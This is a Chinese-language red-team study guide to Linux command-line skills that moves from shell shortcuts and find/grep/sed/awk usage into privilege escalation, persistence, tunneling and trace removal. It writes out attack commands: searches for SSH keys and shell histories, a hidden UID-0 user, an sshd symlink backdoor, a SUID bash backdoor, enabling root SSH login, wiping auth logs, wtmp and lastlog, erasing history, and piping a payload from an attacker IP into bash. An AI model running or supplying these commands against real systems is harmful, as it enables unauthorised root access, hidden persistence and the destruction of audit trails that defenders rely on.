### 命令行基础入门

- 终端与Shell的核心概念：终端、Shell、Bash的区别与关系
- 命令行通用语法：`命令 [选项] [参数]` 标准格式
- **必会快捷键（攻防高频使用，全面补充版）**
  - **光标移动类**
    - `Ctrl+A` / `Home`：光标跳转到**行首**（命令开头）
    - `Ctrl+E` / `End`：光标跳转到**行尾**（命令结尾）
    - `Ctrl+F` / `→`：光标向**右**移动一个字符
    - `Ctrl+B` / `←`：光标向**左**移动一个字符
    - `Alt+F`：光标向**右**移动一个单词（以空格/符号分隔）
    - `Alt+B`：光标向**左**移动一个单词
    - `Ctrl+XX`：在当前光标位置与行首之间快速切换
  - **文本编辑类（核心补充）**
    - `Ctrl+U`：**清除/剪切**光标位置到**行首**的所有内容
    - `Ctrl+K`：**清除/剪切**光标位置到**行尾**的所有内容
    - `Ctrl+W`：**清除/剪切**光标左侧的**一个单词**
    - `Alt+D`：**清除/剪切**光标右侧的**一个单词**
    - `Ctrl+C`：**终止**当前正在运行的命令/进程，同时也会**清空当前输入行**
    - `Ctrl+Y`：**粘贴**之前使用 `Ctrl+U` / `Ctrl+K` / `Ctrl+W` 剪切的内容
    - `Alt+T`：交换光标前两个单词的位置
    - `Ctrl+T`：交换光标前两个字符的位置
    - `Alt+U`：将光标位置到单词结尾的字母**转为大写**
    - `Alt+L`：将光标位置到单词结尾的字母**转为小写**
    - `Alt+C`：将光标位置的字母**转为大写**，光标移动到单词结尾
    - `#`（在行首添加）：将当前命令注释掉（不执行，存入历史）
  - **屏幕与终端控制类**
    - `Ctrl+L`：**清空**终端屏幕，等同于 `clear`命令
    - `Ctrl+S`：**暂停**终端屏幕输出（锁屏）
    - `Ctrl+Q`：**恢复**终端屏幕输出（解锁）
    - `Ctrl+D`：**退出**当前终端/Shell会话（若当前行无输入）；或删除光标处的字符（若有输入）
    - `Ctrl+Z`：将当前正在运行的进程**挂起**（暂停并放入后台），可使用 `fg` 恢复
  - **历史命令类**
    - `Ctrl+R`：**反向搜索**历史执行命令（输入关键词搜索），按 `Ctrl+R` 切换上一个匹配结果，按 `Enter` 执行，按 `Esc` 退出搜索并保留当前命令
    - `Ctrl+G`：退出历史命令搜索模式
    - `Ctrl+P` / `↑`：切换到**上一条**历史执行命令
    - `Ctrl+N` / `↓`：切换到**下一条**历史执行命令
    - `Alt+.` / `Esc+.`：快速插入**上一条命令的最后一个参数**
    - `!`：历史命令快速执行
      - `!编号`：执行历史命令列表中指定编号的命令
      - `!字符串`：执行最近一条以该字符串开头的命令
      - `!$`：引用上一条命令的最后一个参数
      - `!*`：引用上一条命令的所有参数
      - `!`：重复执行上一条命令
      - `^旧^新`：将上一条命令中的“旧”字符串替换为“新”并执行
- 历史命令管理：`history`命令查看历史列表，`history -c` 清空当前历史，`HISTFILE` 变量控制历史文件存储位置
- 帮助命令（自主学习核心）
  - `man 命令名`：查看命令的官方手册，最全用法参考
  - `命令名 --help`：查看命令的内置帮助，快速查询常用参数
  - `info 命令名`：补充手册，用于复杂命令的详细说明

## find 命令详解

`find` 是 Linux 下**最强大的文件搜索命令**，在 Web 渗透测试和红队攻防中是**信息枚举、提权辅助、痕迹清理**的核心工具。它支持按文件名、类型、权限、时间、大小等多维度精准搜索，并可对搜索结果直接执行命令。

### 一、基础语法

```bash
find [搜索路径] [匹配条件] [操作]
```

- **搜索路径**：默认为当前目录（`.`），可指定绝对路径（如 `/`、`/var/www`）或相对路径。
- **匹配条件**：定义搜索规则（如文件名、权限、类型）。
- **操作**：对搜索到的文件执行指定动作（如打印、删除、执行命令），默认为 `-print`（打印结果）。

### 二、核心必会参数（按场景分类）

#### 2.1 基础搜索：按文件名与类型

| 参数              | 作用                                                                                  | 红队场景                         | 示例                            |
| ----------------- | ------------------------------------------------------------------------------------- | -------------------------------- | ------------------------------- |
| `-name "模式"`  | 按**文件名**搜索（区分大小写），支持通配符 `*`（任意字符）、`?`（单个字符） | 搜索配置文件、备份文件、webshell | `find /var/www -name "*.php"` |
| `-iname "模式"` | 按文件名搜索（**忽略大小写**）                                                  | 搜索大小写混合的敏感文件         | `find /home -iname "id_rsa*"` |
| `-type f`       | 仅搜索**普通文件**                                                              | 搜索可执行文件、文本文件、脚本   | `find /tmp -type f`           |
| `-type d`       | 仅搜索**目录**                                                                  | 搜索隐藏目录、web站点目录        | `find / -type d -name ".ssh"` |
| `-type l`       | 仅搜索**软链接**                                                                | 搜索可疑链接后门、路径穿越利用点 | `find / -type l`              |

#### 2.2 权限与所有者搜索（提权核心场景）

| 参数             | 作用                                     | 红队场景               | 示例                          |
| ---------------- | ---------------------------------------- | ---------------------- | ----------------------------- |
| `-perm 权限`   | 按**精确权限**搜索                 | 搜索特定权限的配置文件 | `find / -perm 777`          |
| `-perm -权限`  | 按**至少包含指定权限**搜索（常用） | 搜索SUID/SGID提权文件  | `find / -perm -u=s -type f` |
| `-user 用户名` | 按**文件所有者**搜索               | 搜索root用户的敏感文件 | `find /root -user root`     |
| `-group 组名`  | 按**文件所属组**搜索               | 搜索高权限组的可写文件 | `find / -group admin`       |
| `-nouser`      | 搜索**无有效所有者**的文件         | 搜索可疑残留文件、后门 | `find / -nouser`            |

#### 2.3 时间属性搜索（日志/备份文件场景）

时间参数默认单位为**天**，`+N` 表示 N 天前，`-N` 表示 N 天内，`N` 表示恰好第 N 天。

| 参数         | 作用                                                | 红队场景                         | 示例                                     |
| ------------ | --------------------------------------------------- | -------------------------------- | ---------------------------------------- |
| `-mtime N` | 按**文件内容修改时间**搜索                    | 查找最近修改的配置文件、webshell | `find /var/www -mtime -7`（7天内修改） |
| `-atime N` | 按**文件访问时间**搜索                        | 查找最近被访问的敏感文件         | `find /home -atime -1`（1天内访问）    |
| `-ctime N` | 按**文件状态改变时间**（权限/所有者修改）搜索 | 查找权限被篡改的文件             | `find /etc -ctime -3`（3天内状态改变） |
| `-mmin N`  | 按**分钟级修改时间**搜索                      | 精准查找最近几分钟的操作痕迹     | `find /tmp -mmin -10`（10分钟内修改）  |

#### 2.4 文件大小搜索（备份包/大文件场景）

单位：`c`（字节）、`k`（KB）、`M`（MB）、`G`（GB），`+` 表示大于，`-` 表示小于。

| 参数         | 作用                             | 红队场景                 | 示例                                     |
| ------------ | -------------------------------- | ------------------------ | ---------------------------------------- |
| `-size +N` | 搜索**大于**指定大小的文件 | 查找大备份包、数据库文件 | `find / -size +100M`（大于100MB）      |
| `-size -N` | 搜索**小于**指定大小的文件 | 查找小脚本、webshell     | `find /var/www -size -10k`（小于10KB） |

#### 2.5 对搜索结果执行操作（批量处理核心）

| 参数                 | 作用                                                                             | 红队场景                 | 示例                                            |
| -------------------- | -------------------------------------------------------------------------------- | ------------------------ | ----------------------------------------------- |
| `-exec 命令 {} \;` | 对每个搜索结果**直接执行命令**（`{}` 代表搜索到的文件，`\;` 为结束符） | 批量复制、删除、查看文件 | `find /tmp -name "*.sh" -exec chmod +x {} \;` |
| `-ok 命令 {} \;`   | 交互式执行命令（每次操作前询问）                                                 | 谨慎删除敏感文件         | `find / -name "*.bak" -ok rm {} \;`           |
| `-delete`          | **直接删除**搜索到的文件（高危，慎用）                                     | 清理痕迹、删除测试文件   | `find /tmp -name "test*" -delete`             |
| `-print`           | 打印搜索结果（默认操作）                                                         | 输出文件列表             | `find /etc -name "*.conf" -print`             |

#### 3.1 信息枚举：提权辅助搜索

##### （1）查找 SUID 提权文件（核心必会）

```bash
# 搜索所有 root 所有者的 SUID 二进制文件，过滤错误输出
find / -perm -u=s -type f 2>/dev/null
```

> **注**：`2>/dev/null` 是红队必加后缀，用于过滤“Permission denied”等权限拒绝的错误提示，让输出更干净。

###### （2）查找可写的文件/目录

```bash
# 搜索全局可写的目录（可能用于上传 payload）
find / -writable -type d 2>/dev/null

# 搜索全局可写的文件（可能用于修改配置、替换脚本）
find / -writable -type f 2>/dev/null
```

###### （3）查找敏感文件

```bash
# 查找 SSH 私钥/公钥文件
find /home /root -name "id_rsa*" -o -name "authorized_keys" 2>/dev/null

# 查找历史命令文件（可能包含密码）
find /home /root -name ".bash_history" -o -name ".zsh_history" 2>/dev/null

# 查找备份文件（.bak、.backup、.old 等）
find /var/www /home -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null
```

#### 3.2 Web 渗透：Webshell 与源码搜索

```bash
# 搜索 Web 目录下的所有 PHP 文件（排查 webshell）
find /var/www/html -type f -name "*.php" 2>/dev/null

# 搜索最近 1 天内修改的 PHP 文件（快速定位新上传的 webshell）
find /var/www/html -type f -name "*.php" -mtime -1 2>/dev/null

# 搜索包含敏感关键词的文件（如 password、config）
find /var/www -type f -exec grep -l "password" {} \; 2>/dev/null
```

#### 3.3 痕迹清理：批量删除操作

```bash
# 查找并删除 /tmp 目录下的所有测试文件
find /tmp -name "test*" -o -name "payload*" -delete 2>/dev/null

# 查找并删除 10 分钟内创建的临时文件
find /tmp -type f -mmin -10 -delete 2>/dev/null
```

#### 3.4 进阶技巧：排除特定目录加速搜索

搜索根目录时，`/proc`、`/sys` 等虚拟文件系统会产生大量干扰，可使用 `-prune` 排除：

```bash
# 搜索根目录，排除 /proc、/sys、/dev 目录
find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -perm -u=s -type f -print 2>/dev/null
```

- 条件判断与分支结构

- 循环结构
  - `for`循环：遍历列表/文件/数值范围，批量操作核心
  - `while`循环：满足条件时循环执行，适合持续监听、无限循环
  - `until`循环：不满足条件时循环执行
  - 循环控制：`break`（跳出循环）、`continue`（跳过本次循环）
- 函数定义与调用
  - 函数定义语法：`函数名() { 命令; }`
  - 函数参数传递、返回值获取
  - 函数作用域，全局变量与局部变量（`local`关键字）
- 数组基础
  - 数组定义、元素读取、遍历、修改
  - 攻防场景用途：批量存储IP、端口、payload、目标列表

### 4.2 Linux权限管理（提权核心基石）

- 基础文件权限详解
  - 权限位结构：`-rwxrwxrwx` 分为3组，分别为**所有者(u)**、**所属组(g)**、**其他用户(o)**
  - 权限含义：`r`=读(4)、`w`=写(2)、`x`=执行(1)，数字权限为三者之和
  - 目录与文件的权限区别：目录的x权限=进入目录的权限，r权限=列出目录内容的权限，w权限=增删改目录内文件的权限
- 必会权限管理命令

| 命令      | 核心作用                      | 必会高频参数                                                                                                   | 攻防场景用法                                                            |
| --------- | ----------------------------- | -------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- |
| `chmod` | 修改文件/目录的权限           | 数字权限用法：`chmod 755 文件名`<br>符号用法：`u+x`、`g-w`、`o=r`<br>`-R` 递归修改目录内所有文件权限 | 给payload添加执行权限、修改配置文件权限、设置SUID权限、修改可写文件权限 |
| `chown` | 修改文件/目录的所有者与所属组 | 基础用法：`chown 所有者:所属组 文件名`<br>`-R` 递归修改                                                    | 修改文件所有者，配合SUID提权、修改后门文件所有者为root、修改web目录权限 |
| `chgrp` | 修改文件/目录的所属组         | `-R` 递归修改                                                                                                | 批量修改文件所属组，配合组权限提权                                      |
| `umask` | 查看/设置默认权限掩码         | 无参数=查看当前掩码<br>`umask 数值` 设置掩码                                                                 | 查看系统默认文件权限，判断新创建文件的权限，寻找可写的新文件            |

- 特殊权限（提权核心重点，必须精通）
  - **SUID权限**：二进制文件设置后，执行时将获得文件所有者的权限（通常是root）
    - 权限标识：`rwsr-xr-x`，所有者x位变为s
    - 数字权限：4xxx，例如 `chmod 4755 文件名`
    - 攻防场景：SUID提权，寻找root所有者的SUID文件，利用其功能执行命令、读取文件
  - **SGID权限**：二进制文件设置后，执行时获得文件所属组的权限；目录设置后，目录内新建文件继承目录的所属组
    - 权限标识：`rwxr-sr-x`，所属组x位变为s
    - 数字权限：2xxx，例如 `chmod 2755 文件名`
    - 攻防场景：SGID提权，利用高权限组的SGID文件获取组权限，访问组内敏感文件
  - **Sticky Bit粘滞位**：通常用于全局可写目录，仅文件所有者、root可删除/修改目录内的文件
    - 权限标识：`rwxrwxrwt`，其他用户x位变为t
    - 数字权限：1xxx，例如 `chmod 1777 目录名`
    - 典型目录：`/tmp`、`/var/tmp`
- ACL访问控制列表
  - 基础概念：扩展权限控制，针对单个用户/组设置精细化权限
  - 必会命令：`getfacl 文件名`（查看ACL权限）、`setfacl 文件名`（设置ACL权限）
  - 攻防场景：查看隐藏的权限配置，绕过基础权限限制，设置后门权限

### 6.2 文本处理三剑客 - grep（文本搜索，必会核心）

- 核心作用：按正则表达式搜索文本内容，匹配指定模式的行
- 必会高频参数
  - `-i`：忽略大小写匹配
  - `-v`：反向匹配，显示不包含模式的行
  - `-n`：显示匹配行的行号
  - `-r`/`-R`：递归搜索目录内的所有文件
  - `-E`：启用扩展正则表达式，等同于 `egrep`
  - `-F`：按固定字符串匹配，不解析正则，等同于 `fgrep`
  - `-o`：仅输出匹配到的内容，而非整行
  - `-c`：统计匹配到的行数
- 攻防场景高频用法
  - 日志中搜索指定IP/URL/关键词：`grep "关键词" access.log`
  - 递归搜索目录内的敏感关键词：`grep -r "password" /var/www/html/`
  - 过滤掉无关行：`ps aux | grep -v "grep" | grep "root"`
  - 提取日志中的IP地址：`grep -E -o "([0-9]{1,3}\.){3}[0-9]{1,3}" access.log`
  - 批量匹配多个关键词：`grep -E "root|admin|password" /etc/passwd`

### 6.3 文本处理三剑客 - sed（流编辑器，文本批量修改核心）

- 核心作用：按行处理文本，实现增、删、改、查、替换操作，非交互式编辑文件
- 必会高频语法与参数
  - 核心语法：`sed [选项] '操作' 文件名`
  - 必会参数
    - `-i`：直接修改原文件（高危操作，测试后使用）
    - `-n`：静默模式，仅输出匹配处理的行
    - `-e`：指定多个编辑操作
    - `-r`：启用扩展正则表达式
  - 必会核心操作
    - 字符串替换：`s/原字符串/新字符串/`，`g`全局替换，`i`忽略大小写
    - 行打印：`p`，配合 `-n`使用
    - 行删除：`d`
    - 行添加：`a`（行后添加）、`i`（行前添加）
    - 行替换：`c`
- 攻防场景高频用法
  - 批量替换文件中的字符串：`sed -i 's/127.0.0.1/192.168.1.1/g' payload.sh`
  - 删除文件中的指定行：`sed -i '5d' test.txt`、`sed -i '/关键词/d' test.txt`
  - 提取指定范围的行：`sed -n '10,20p' access.log`
  - 日志清理：`sed -i '/攻击IP/d' /var/log/auth.log`
  - 命令执行绕过：替换命令中的关键词，规避WAF检测
  - 修改配置文件：`sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config`

### 6.4 文本处理三剑客 - awk（文本分析与字段处理，高级核心）

- 核心作用：按字段处理文本，支持条件判断、循环、数组、函数，是强大的文本分析编程语言，日志分析、数据提取的核心工具
- 基础语法：`awk [选项] '模式{动作}' 文件名`
- 核心内置变量（必会）
  - `$0`：当前整行内容
  - `$1-$n`：当前行的第1到第n个字段
  - `FS`：字段分隔符，默认空格/制表符，等同于 `-F`参数
  - `OFS`：输出字段分隔符
  - `NR`：当前处理的行号（总记录数）
  - `NF`：当前行的字段总数，`$NF`代表最后一个字段
  - `RS`：行分隔符，默认换行符
- 必会高频用法
  - 指定分隔符提取字段：`awk -F ":" '{print $1,$3}' /etc/passwd`（提取用户名和UID）
  - 条件过滤：`awk -F ":" '$3==0 {print $1}' /etc/passwd`（提取UID=0的root用户）
  - 日志分析：`awk '$9==200 {print $1}' access.log`（提取状态码200的访问IP）
  - 统计访问次数：`awk '{ip[$1]++} END{for(i in ip) print ip[i],i}' access.log | sort -nr`
  - 过滤指定范围的数值：`awk '$NF>1024 {print $0}' netstat.log`（提取目标端口大于1024的连接）
  - 多条件判断：`awk -F ":" '$3>=1000 && $7=="/bin/bash" {print $1}' /etc/passwd`（提取普通可登录用户）
- 高级进阶：awk支持循环、数组、函数、正则匹配，可编写复杂的日志分析脚本、数据处理脚本，是红队日志分析、信息提取的核心工具

### 6.5 三剑客组合实战（攻防高频场景）

- 日志IP统计：`cat access.log | awk '{print $1}' | sort | uniq -c | sort -nr | head -20`
- 提取系统所有可登录用户：`cat /etc/passwd | grep -v "/sbin/nologin" | grep -v "/bin/false" | awk -F ":" '{print $1}'`
- 查找所有SUID文件：`find / -perm -u=s -type f 2>/dev/null | awk '{print $NF}'`
- 清理auth.log中指定IP的登录记录：`sed -i '/攻击IP/d' /var/log/auth.log`
- 批量提取子域名：`cat domain.txt | grep -E -o "[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | sort -u`

### 7.2 红队高频接触的核心服务详解

#### 7.2.1 SSH服务

- 核心配置文件：`/etc/ssh/sshd_config`
- 核心配置项：端口、PermitRootLogin、PasswordAuthentication、PubkeyAuthentication、AllowUsers、PermitEmptyPasswords
- 常见安全问题：弱口令、root用户远程登录、密钥泄露、配置后门、版本漏洞
- 攻防场景：远程登录、端口转发、隧道搭建、暴力破解、密钥登录权限维持

#### 7.2.2 Web服务（Apache/Nginx）

- Apache核心配置：`/etc/httpd/`、`/etc/apache2/`，站点配置、虚拟主机、目录权限、模块配置
- Nginx核心配置：`/etc/nginx/`，nginx.conf、站点配置、反向代理、负载均衡、访问控制
- 站点根目录常见路径：`/var/www/html/`、`/usr/share/nginx/html/`、`/home/[用户名]/www/`
- 常见安全问题：目录遍历、文件上传、配置错误导致的源码泄露、反向代理SSRF、模块漏洞
- 攻防场景：web渗透打点、webshell上传、web服务提权、日志分析、反向代理隧道

#### 7.2.3 数据库服务（MySQL/MariaDB/PostgreSQL/Redis）

- MySQL/MariaDB：配置文件 `/etc/my.cnf`、`/etc/mysql/`，默认端口3306，数据存储路径、用户权限配置、常见安全问题（弱口令、未授权访问、root远程登录、UDF提权）
- PostgreSQL：配置文件 `/var/lib/pgsql/`，默认端口5432，弱口令、未授权访问、提权漏洞
- Redis：配置文件 `/etc/redis/redis.conf`，默认端口6379，常见安全问题（未授权访问、弱口令、绑定0.0.0.0、主从复制RCE）
- 攻防场景：数据库信息泄露、数据拖取、未授权访问打点、数据库提权、内网横向渗透

#### 7.2.4 文件共享服务（Samba/NFS/FTP）

- Samba：配置文件 `/etc/samba/smb.conf`，默认端口139/445，常见安全问题（弱口令、匿名访问、配置错误、SMB漏洞（永恒之蓝等））
- NFS：配置文件 `/etc/exports`，默认端口2049，常见安全问题（匿名挂载、no_root_squash配置导致的提权）
- FTP（vsftpd）：配置文件 `/etc/vsftpd.conf`，默认端口21，常见安全问题（匿名访问、弱口令、主动/被动模式配置漏洞、版本漏洞）
- 攻防场景：文件共享服务打点、未授权访问获取敏感文件、NFS提权、SMB漏洞利用、内网横向

#### 7.2.5 其他常见服务

- DNS服务（bind）：默认端口53，DNS区域传送、DNS劫持、DNS隧道
- 邮件服务（Postfix/Sendmail）：默认端口25/110/143，邮件服务漏洞、弱口令、邮件伪造
- 代理服务（Squid）：默认端口3128，未授权代理、代理隧道、内网访问
- 远程桌面服务（VNC）：默认端口5900，弱口令、未授权访问、远程控制

### 7.3 Linux系统安全机制

- SELinux/AppArmor：强制访问控制机制，基础操作、状态查看、临时关闭、规则配置

### 7.4 Linux安全基线与攻防视角配置检查

- 系统信息安全检查：内核版本、系统版本、补丁情况

### 8.2 Linux本地提权技术（红队核心必会）

#### 8.2.1 提权核心原理

- 权限提升：从低权限用户（如www-data、普通用户）获取root超级用户权限的过程
- 提权核心逻辑：利用系统配置错误、软件漏洞、内核漏洞，突破权限限制，执行高权限命令

#### 8.2.2 必会提权方式详解

1. **内核漏洞提权**

   - 原理：利用Linux内核的权限提升漏洞，执行exp获取root权限
   - 核心流程：内核版本探测 -> 寻找对应版本的提权exp -> 上传exp到目标 -> 编译执行 -> 获取root权限
   - 经典漏洞：脏牛（CVE-2016-5195）、Dirty Pipe（CVE-2022-0847）、PTRACE_TRACEME漏洞等
   - 注意事项：内核漏洞可能导致系统崩溃，实战中需谨慎使用，优先选择配置错误提权
2. **SUID/SGID提权**

   - 原理：利用root所有者的SUID二进制文件，执行时获得root权限，通过文件的功能执行系统命令、读取敏感文件
   - 核心流程：查找SUID文件 -> 筛选可利用的文件 -> 利用文件功能执行命令/读取文件 -> 获取root权限
   - 高频可利用SUID文件：`find`、`vim`、`nmap`、`less`、`more`、`cp`、`mv`、`bash`、`python`等
   - 进阶利用：SUID文件的库文件劫持、路径劫持提权
3. **Sudo提权**

   - 原理：利用sudo配置错误，低权限用户可通过sudo执行高权限命令，获取root权限
   - 核心流程：`sudo -l`查看sudo权限 -> 分析可执行的命令 -> 寻找命令的提权方法 -> 执行命令获取root权限
   - 高频提权场景
     - 可执行 `su`、`bash`、`sh`等Shell命令，直接 `sudo bash`获取root
     - 可执行有命令执行功能的程序（vim、find、python、nmap等），通过程序执行系统命令
     - sudo配置通配符漏洞，利用通配符绕过限制执行恶意命令
     - NOPASSWD配置，无需密码执行sudo命令
     - 环境变量保留配置，LD_PRELOAD/LD_LIBRARY_PATH劫持提权
4. **计划任务提权**

   - 原理：利用root用户执行的计划任务，任务执行的脚本/文件可被低权限用户修改，替换为恶意脚本，计划任务执行时获取root权限
   - 核心流程：枚举系统计划任务 -> 查找root执行的任务 -> 检查任务脚本/文件的权限 -> 替换/修改脚本为恶意内容 -> 等待计划任务执行获取root权限
   - 高频场景：计划任务脚本全局可写、脚本路径通配符、脚本引用相对路径导致的路径劫持
5. **环境变量劫持提权**

   - 原理：SUID程序、计划任务脚本使用相对路径调用系统命令，修改PATH环境变量，将恶意命令的路径放在PATH最前面，程序执行时调用恶意命令，获取高权限
   - 核心流程：找到使用相对路径执行命令的高权限程序 -> 编写同名恶意命令 -> 修改PATH环境变量 -> 执行高权限程序，触发恶意命令 -> 获取root权限
6. **Capability提权**

   - 原理：Linux内核Capability机制，给二进制文件分配部分root权限，利用分配的高权限Capability实现提权
   - 核心流程：查找有高权限Capability的文件 -> 利用Capability的功能执行命令/读取文件 -> 提权
   - 高频可利用Capability：`cap_setuid`、`cap_sys_admin`、`cap_dac_read_search`等
7. **NFS提权**

   - 原理：NFS共享配置了 `no_root_squash`选项，客户端root用户访问共享时，不会被压缩为nfsnobody，保留root权限，可创建SUID文件，在服务端执行获取root权限
   - 核心流程：枚举NFS共享 -> 检查 `no_root_squash`配置 -> 挂载NFS共享 -> 创建SUID root的bash文件 -> 在服务端执行该文件，获取root权限
8. **Docker/LXC容器逃逸提权**

   - 原理：容器配置不当，挂载了宿主机敏感目录、拥有高权限Capability、特权模式运行，突破容器隔离，获取宿主机root权限
   - 核心流程：判断是否在容器内 -> 检查容器权限配置 -> 利用配置漏洞逃逸 -> 获取宿主机root权限

### 8.3 Linux权限维持技术（红队持久化访问核心）

#### 8.3.1 权限维持核心原则

- 隐蔽性：避免被管理员发现，降低日志记录
- 持久性：服务器重启、配置更新后仍可访问
- 可控性：随时可重新获取目标服务器权限
- 多样性：多种后门方式互为备份，避免单个后门被清除后失去访问

#### 8.3.2 必会权限维持方式详解

1. **SSH后门**

   - SSH密钥登录后门：将攻击者公钥写入目标 `/root/.ssh/authorized_keys`、`/home/[用户]/.ssh/authorized_keys`，实现无密码登录
   - SSH后门用户：创建UID=0的隐藏用户，等同于root权限，`useradd -o -u 0 -g 0 后门用户名`
   - SSH软链接后门：`ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -o Port=2222;`，连接2222端口，任意密码均可登录root
   - SSH wrapper后门：修改PAM配置、SSH源码，植入后门，记录密码，万能密码登录
2. **计划任务后门**

   - 原理：通过crontab创建定时任务，定时执行反弹Shell、后门脚本，实现持久化访问
   - 高频用法：每分钟定时执行反弹Shell，定时下载执行恶意脚本，定时开启后门端口监听
   - 隐蔽技巧：将计划任务写入系统级计划任务目录，隐藏计划任务日志，使用系统自带命令执行payload
3. **SUID后门**

   - 原理：创建root所有者的SUID bash文件，低权限用户执行该文件即可获取root权限
   - 核心命令：`cp /bin/bash /tmp/.backdoor; chmod 4755 /tmp/.backdoor`，执行 `/tmp/.backdoor -p`即可获取root权限
   - 隐蔽技巧：将后门文件放到隐藏目录，修改文件时间戳，伪装成系统文件
4. **反弹Shell持久化**

   - 原理：将反弹Shell脚本写入系统启动项、用户登录脚本，系统启动/用户登录时自动执行反弹Shell
   - 写入路径：`/etc/rc.local`、`/etc/profile`、`/etc/bash.bashrc`、`/home/[用户]/.bashrc`、systemd自定义服务
   - 隐蔽技巧：使用加密反弹Shell，使用系统自带命令（bash、python、curl）执行payload，避免落地文件
5. **Web后门**

   - 原理：在web站点目录植入一句话木马、webshell，通过web访问获取服务器权限
   - 隐蔽技巧：将webshell隐藏在深层目录，伪装成系统图片/配置文件，加密免杀，添加访问权限控制
6. **PAM后门**

   - 原理：修改Linux PAM认证模块，植入后门，记录所有用户的登录密码，同时支持万能密码登录
   - 特点：隐蔽性极强，SSH、su、sudo登录均会触发，系统重装前持续有效
7. **Rootkit后门**

   - 原理：内核级/用户级Rootkit，隐藏进程、文件、端口、登录记录，完全控制目标系统
   - 特点：隐蔽性最高，对抗杀毒软件、EDR，专业红队高级权限维持手段

### 8.4 Linux内网穿透与流量转发（红队内网横向核心）

#### 8.4.1 核心概念

- 内网穿透：突破内网隔离，让外网攻击者可访问内网目标，实现内网横向渗透
- 端口转发：将目标主机的端口转发到攻击者主机，或反向转发，实现流量互通
- 隧道：加密传输攻击流量，规避防火墙、入侵检测系统，隐藏攻击行为

#### 8.4.2 必会隧道与转发技术详解

1. **SSH隧道（最常用，无需额外安装工具）**

   - 本地端口转发（L型）：`ssh -L 本地端口:目标IP:目标端口 跳板机用户@跳板机IP`，将内网目标端口转发到攻击者本地
   - 远程端口转发（R型，反向隧道）：`ssh -R 远程端口:目标IP:目标端口 攻击者VPS用户@攻击者VPS_IP`，将内网目标端口反向转发到攻击者公网VPS，实现内网穿透
   - 动态SOCKS代理（D型）：`ssh -D 本地SOCKS端口 跳板机用户@跳板机IP`，创建SOCKS5代理，通过proxychains访问整个内网网段
   - 进阶用法：`-fN`参数将隧道放入后台运行，免密登录实现隧道自动重连，端口复用规避检测
2. **Netcat/nc/socat端口转发与Shell**

   - 正向Shell：目标主机开启端口监听，攻击者连接获取Shell
   - 反向Shell：目标主机主动连接攻击者监听的端口，获取Shell，突破防火墙入站限制
   - 端口转发：nc/socat实现TCP/UDP端口转发，将内网端口转发到外网
   - socat进阶：加密传输、端口复用、全功能Shell，比nc更强大，红队高频使用
3. **内网穿透工具**

   - Frp：高性能反向代理，支持TCP/UDP/HTTP/HTTPS协议，内网穿透核心工具，配置简单，稳定性强
   - Ngrok：一键式内网穿透工具，支持HTTP/HTTPS/TCP协议，适合快速穿透内网web服务、SSH服务
   - ICMP/DNS隧道：利用ICMP协议、DNS协议搭建隧道，突破防火墙端口限制，在极端受限环境下实现内网访问
4. **Iptables端口转发**

   - 原理：利用Linux内核的iptables防火墙，实现端口流量转发，无需额外安装工具，隐蔽性强
   - 核心用法：将本地端口流量转发到内网目标IP和端口，实现跳板机横向访问
5. **Proxychains代理链**

   - 原理：将任意命令的网络流量通过指定的SOCKS/HTTP代理转发，实现工具直接访问内网
   - 核心用法：配置代理地址，`proxychains 命令`，让nmap、sqlmap、浏览器等工具直接访问内网目标

### 8.5 Linux反弹Shell全攻略（Web渗透核心必会）

### 8.6 Linux痕迹清理与免杀基础（红队规避检测核心）

#### 8.6.1 痕迹清理核心原则

- 最小化痕迹：攻击过程中尽量减少日志生成、文件落地
- 精准清理：仅清理攻击相关的痕迹，避免清空全部日志触发告警
- 时间伪装：修改文件时间戳，伪装成系统原有文件
- 内存执行：尽量使用无文件攻击，避免payload落地

#### 8.6.2 必会痕迹清理技术

1. **历史命令清理**

   ```bash
   # 清空当前用户历史命令
   history -c && rm -f ~/.bash_history
   # 临时关闭历史命令记录
   unset HISTFILE
   export HISTSIZE=0
   export HISTFILESIZE=0
   # 不记录当前执行的命令（命令前加空格，需系统配置支持）
    命令内容
   ```
2. **系统日志清理**

   ```bash
   # 精准删除指定IP的登录记录
   sed -i '/攻击者IP/d' /var/log/auth.log /var/log/secure
   # 清空指定日志文件
   > /var/log/auth.log
   cat /dev/null > /var/log/syslog
   # 清理登录成功记录
   echo > /var/log/wtmp
   echo > /var/log/lastlog
   echo > /var/run/utmp
   ```
3. **文件痕迹隐藏**

   - 隐藏文件：文件名以 `.`开头，例如 `.backdoor.sh`
   - 修改文件时间戳：`touch -r 系统原有文件 后门文件`，伪装文件创建/修改时间
   - 扩展属性隐藏：`chattr +i 文件名`，设置文件不可修改，避免被误删
   - 内存执行：使用 `curl http://攻击者IP/payload.sh | bash`，无文件执行payload，不落地到磁盘

#### 8.6.3 免杀基础

- 编码绕过：base64编码、hex编码、url编码payload，拆分执行，规避特征码检测
